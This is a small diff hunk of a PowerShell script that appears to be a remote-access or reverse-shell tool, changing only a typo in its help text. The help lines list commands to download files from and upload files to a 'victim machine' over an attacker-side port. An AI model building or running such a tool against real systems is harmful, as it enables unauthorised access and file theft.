@@ -782,7 +782,7 @@ function Get-Options {
 		writeConsoleTagToStream($stream,("`t download <fileFromVictim>".PadRight(25,' ') + "`t`t`t Download a file from victim machine.[<fileFromVictim>: An absolute file path in victim machine that the attacker downloads]" + "`r`n"))
 		writeConsoleTagToStream($stream,("`t upload <fileToVictim>".PadRight(25,' ') + "`t`t`t Upload a file to victim machine.[<fileToVictim>: An absolute file path in victim machine to store file uploaded by attacker]" + "`r`n"))
 		writeConsoleTagToStream($stream,("`t exit".PadRight(25,' ') + "`t`t`t Exit the program" + "`r`n"))
-		writeConsoleTagToStream($stream,("`t Important: File transfer port should be opened in attacker's side to achieve download,uploading files." + "`r`n" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t Important: File transfer port should be opened in attacker's side to achieve downloading,uploading files." + "`r`n" + "`r`n"))
 		writeConsoleTagToStream($stream,("Powershell>")) 
 	}
 	elseif($ModuleNumber -eq 1) {
